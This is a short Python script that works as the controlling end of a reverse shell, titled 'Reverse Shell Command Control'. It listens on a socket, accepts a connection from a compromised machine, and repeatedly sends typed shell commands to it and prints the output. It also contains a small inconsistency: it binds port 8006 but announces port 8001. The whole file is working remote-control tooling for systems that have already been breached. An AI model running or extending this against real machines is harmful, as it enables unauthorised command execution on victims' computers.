import socket
import pyfiglet
import os

def main():
    # Display the initial message
    os.system('tput clear')
    f=pyfiglet.Figlet(font='cybermedium')
    print(f.renderText('Reverse Shell Command Control'))
    print ('\033[1m')
    print("Simplifies command execution on a system with reverse shell access")
    print ('\033[0m')

    # Creating a command center service on a specific port
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('localhost',8006))
    s.listen(2)
    print('Listening on port 8001 for connections...')
    (client, (ip,port))=s.accept()
    print("Received connection from ",ip," port:",port)
    print("Client is:",client)

    while True:
        client.send('pwd'.encode())
        r=client.recv(2048).decode()
        # print("Current directory is:",r)
        c=input('~'+r[:len(r)-2]+'$').encode()
        # Sending the encoded command to the remote system
        client.send(c)
        res=client.recv(2048).decode().split('~')
        if res[1]:
            print(res[1])
        else:
            print(res[0])



if __name__ == '__main__':
    main()
